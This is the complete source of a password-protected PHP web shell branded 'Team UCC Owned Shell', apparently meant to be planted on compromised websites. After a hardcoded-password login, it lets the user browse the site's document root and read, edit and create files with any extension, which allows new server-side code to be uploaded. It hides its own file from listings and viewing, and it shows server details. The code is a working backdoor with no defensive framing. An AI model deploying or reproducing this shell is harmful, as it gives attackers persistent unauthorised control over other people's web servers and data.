<?php
session_start();

$PASSWORD = 'odiyan911';
$SHELL_NAME = 'temp.php';

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['authenticated'] = true;
        } else {
            $error = "Incorrect password.";
        }
    }
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8" />
            <title>Access Restricted</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                body {
                    background-color: #000;
                    color: #0f0;
                    font-family: 'Share Tech Mono', monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    flex-direction: column;
                }
                h1 {
                    text-shadow: 0 0 10px #0f0;
                    margin-bottom: 20px;
                }
                form {
                    background: #001100;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 15px #0f0;
                }
                input[type="password"] {
                    background: #002200;
                    border: 1px solid #0f0;
                    color: #0f0;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 1.2em;
                    padding: 10px;
                    border-radius: 5px;
                    width: 250px;
                    outline: none;
                }
                button {
                    margin-top: 15px;
                    background: #0f0;
                    border: none;
                    color: #000;
                    font-weight: bold;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-family: 'Share Tech Mono', monospace;
                    font-size: 1.1em;
                    transition: background-color 0.3s ease;
                    width: 100%;
                }
                button:hover {
                    background: #0c0;
                }
                .error {
                    color: #f00;
                    margin-top: 15px;
                    font-weight: bold;
                    text-align: center;
                    text-shadow: 0 0 5px #f00;
                }
            </style>
        </head>
        <body>
            <h1>ACCESS RESTRICTED</h1>
            <form method="POST" autocomplete="off">
                <input type="password" name="password" placeholder="Enter password" autofocus required />
                <button type="submit">ENTER</button>
                <?php if (isset($error)): ?>
                    <div class="error"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

// Base directory is DOCUMENT_ROOT to allow access above shell location
$base_dir = realpath(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__);
if ($base_dir === false) {
    $base_dir = realpath(__DIR__);
}

// Current path from GET, default to base_dir
$requested_path = isset($_GET['path']) ? $_GET['path'] : '';
$real_path = realpath($base_dir . DIRECTORY_SEPARATOR . $requested_path);
if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
    $real_path = $base_dir;
}

// Handle file creation or modification
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['filename'], $_POST['content'], $_POST['current_path'], $_POST['action'])) {
        $filename = basename($_POST['filename']);
        $content = $_POST['content'];
        $current_path = $_POST['current_path'];
        $action = $_POST['action'];

        $target_dir = realpath($base_dir . DIRECTORY_SEPARATOR . $current_path);

        if ($target_dir === false || strpos($target_dir, $base_dir) !== 0) {
            $message = "Error: Invalid directory.";
        } elseif ($filename === $SHELL_NAME) {
            $message = "Error: Modification of shell file is not allowed.";
        } else {
            $filepath = $target_dir . DIRECTORY_SEPARATOR . $filename;
            if ($action === 'create') {
                if (file_exists($filepath)) {
                    $message = "Error: File already exists.";
                } else {
                    if (file_put_contents($filepath, $content) !== false) {
                        $message = "File '$filename' created successfully.";
                    } else {
                        $message = "Error: Could not create file.";
                    }
                }
            } elseif ($action === 'edit') {
                if (!file_exists($filepath)) {
                    $message = "Error: File does not exist.";
                } else {
                    if (file_put_contents($filepath, $content) !== false) {
                        $message = "File '$filename' saved successfully.";
                    } else {
                        $message = "Error: Could not save file.";
                    }
                }
            }
        }
    }
}

// Handle file viewing or editing
$view_file = isset($_GET['view']) ? $_GET['view'] : '';
$file_content = '';
$file_error = '';
$editing = false;
if ($view_file !== '') {
    $view_path = realpath($base_dir . DIRECTORY_SEPARATOR . $view_file);
    if ($view_path === false || strpos($view_path, $base_dir) !== 0 || !is_file($view_path)) {
        $file_error = "Error: File not found or access denied.";
    } elseif (basename($view_path) === $SHELL_NAME) {
        $file_error = "Error: Access to shell file content is forbidden.";
    } else {
        $file_content = file_get_contents($view_path);
        $editing = isset($_GET['edit']);
    }
}

$files = scandir($real_path);

function relativePath($base, $path) {
    return ltrim(str_replace($base, '', $path), DIRECTORY_SEPARATOR);
}

// Current relative path from base_dir
$current_rel_path = relativePath($base_dir, $real_path);

// Server info for info bar
$server_info = [
    'PHP Version' => phpversion(),
    'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A',
    'User' => get_current_user(),
    'Document Root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A',
    'Server Name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A',
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Team UCC Owned Shell</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    body {
        background-color: #0f0f0f;
        color: #00ff00;
        font-family: 'Share Tech Mono', monospace;
        margin: 0;
        padding: 0;
    }
    .info-bar {
        background-color: #002200;
        border-bottom: 2px solid #00ff00;
        padding: 10px 20px;
        font-size: 0.9em;
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        user-select: none;
        align-items: center;
        justify-content: space-between;
    }
    .info-left, .info-right {
        display: flex;
        gap: 15px;
        align-items: center;
        flex-wrap: wrap;
    }
    .info-bar div {
        white-space: nowrap;
    }
    h1, h2 {
        text-shadow: 0 0 5px #00ff00;
        margin: 20px;
    }
    a {
        color: #00ff00;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    .container {
        max-width: 900px;
        margin: 0 auto 40px auto;
        padding: 0 20px 20px 20px;
    }
    ul {
        list-style-type: none;
        padding-left: 0;
    }
    ul li {
        padding: 5px 0;
        border-bottom: 1px solid #004400;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    ul li span.dir {
        color: #00cc00;
        font-weight: bold;
    }
    .message {
               background-color: #003300;
        border: 1px solid #00ff00;
        padding: 10px;
        margin-bottom: 20px;
        border-radius: 5px;
    }
    .error {
        background-color: #330000;
        border-color: #ff0000;
        color: #ff4444;
    }
    .success {
        background-color: #003300;
        border-color: #00ff00;
        color: #00ff00;
    }
    form {
        background-color: #001100;
        padding: 15px;
        border-radius: 5px;
        margin-top: 20px;
    }
    label {
        display: block;
        margin-bottom: 8px;
    }
    input[type="text"], textarea {
        width: 100%;
        background-color: #002200;
        border: 1px solid #00ff00;
        color: #00ff00;
        font-family: 'Share Tech Mono', monospace;
        font-size: 1em;
        padding: 8px;
        border-radius: 3px;
        margin-bottom: 15px;
        resize: vertical;
    }
    button {
        background-color: #00ff00;
        border: none;
        color: #000;
        font-weight: bold;
        padding: 10px 20px;
        cursor: pointer;
        border-radius: 3px;
        font-family: 'Share Tech Mono', monospace;
        font-size: 1em;
        transition: background-color 0.3s ease;
    }
    button:hover {
        background-color: #00cc00;
    }
    pre {
        background-color:#001100;
        border: 1px solid #00ff00;
        padding: 15px;
        border-radius: 5px;
        overflow-x: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        max-height: 400px;
    }
    nav {
        margin-bottom: 20px;
    }
    nav a {
        margin-right: 10px;
    }
    .file-actions button {
        background-color: transparent;
        border: 1px solid #00ff00;
        color: #00ff00;
        padding: 3px 8px;
        font-size: 0.9em;
        border-radius: 3px;
        cursor: pointer;
        font-family: 'Share Tech Mono', monospace;
        transition: background-color 0.3s ease;
    }
    .file-actions button:hover {
        background-color: #00ff00;
        color: #000;
    }
</style>
</head>
<body>
<div class="info-bar">
    <div class="info-left">
        <div><strong>Shell Name:</strong> <?php echo htmlspecialchars($SHELL_NAME); ?></div>
        <?php foreach ($server_info as $key => $value): ?>
            <div><strong><?php echo htmlspecialchars($key); ?>:</strong> <?php echo htmlspecialchars($value); ?></div>
        <?php endforeach; ?>
    </div>
    <div class="info-right">
        <a href="?logout=1" style="color:#ff4444; font-weight:bold; text-decoration:none;">Logout</a>
    </div>
</div>
<div class="container">
    <h1>Team UCC Owned Shell</h1>
    <nav>
        <strong>Current Path:</strong>
        <?php
        // Build breadcrumb navigation from base_dir to current path
        $parts = explode(DIRECTORY_SEPARATOR, $current_rel_path);
        $path_accum = '';
        echo '<a href="?">/</a>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $path_accum .= DIRECTORY_SEPARATOR . $part;
            echo ' / <a href="?path=' . urlencode(ltrim($path_accum, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($part) . '</a>';
        }
        ?>
    </nav>

    <?php if ($message): ?>
        <div class="message <?php echo strpos($message, 'Error') === false ? 'success' : 'error'; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
    <?php endif; ?>

    <?php if ($file_error): ?>
        <div class="message error"><?php echo htmlspecialchars($file_error); ?></div>
    <?php endif; ?>

    <?php if ($file_content !== ''): ?>
        <h2><?php echo $editing ? 'Editing File:' : 'Viewing File:'; ?> <?php echo htmlspecialchars($view_file); ?></h2>
        <?php if ($editing): ?>
            <form method="POST" autocomplete="off">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars(basename($view_file)); ?>" />
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars(dirname($view_file)); ?>" />
                <input type="hidden" name="action" value="edit" />
                <textarea name="content" rows="20" required><?php echo htmlspecialchars($file_content); ?></textarea>
                <button type="submit">Save</button>
                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="margin-left:10px; color:#00ff00;">Cancel</a>
            </form>
        <?php else: ?>
            <pre><?php echo htmlspecialchars($file_content); ?></pre>
            <p>
                <a href="?view=<?php echo urlencode($view_file); ?>&edit=1" style="color:#00ff00;">Edit</a> |
                <a href="?path=<?php echo urlencode($current_rel_path); ?>" style="color:#00ff00;">Back to directory</a>
            </p>
        <?php endif; ?>
    <?php else: ?>
        <h2>Files and Directories</h2>
        <ul>
            <?php
            if ($real_path !== $base_dir) {
                $parent_path = dirname($current_rel_path);
                echo '<li><a href="?path=' . urlencode($parent_path) . '">[..]</a></li>';
            }
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                if ($file === $SHELL_NAME) continue;
                $full_path = $real_path . DIRECTORY_SEPARATOR . $file;
                $rel_path = ltrim($current_rel_path . DIRECTORY_SEPARATOR . $file, DIRECTORY_SEPARATOR);
                if (is_dir($full_path)) {
                    echo '<li><span class="dir">[DIR]</span> <a href="?path=' . urlencode($rel_path) . '">' . htmlspecialchars($file) . '</a></li>';
                } else {
                    echo '<li><a href="?view=' . urlencode($rel_path) . '">' . htmlspecialchars($file) . '</a>
                    <span class="file-actions">
                        <a href="?view=' . urlencode($rel_path) . '&edit=1"><button type="button">Edit</button></a>
                    </span>
                    </li>';
                }
            }
            ?>
        </ul>

        <h2>Create / Upload New File</h2>
        <form method="POST" autocomplete="off">
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_rel_path); ?>" />
            <input type="hidden" name="action" value="create" />
            <label for="filename">Filename (any extension allowed):</label>
            <input type="text" id="filename" name="filename" required />

            <label for="content">Content:</label>
            <textarea id="content" name="content" rows="10" required></textarea>

            <button type="submit">Create / Upload File</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>
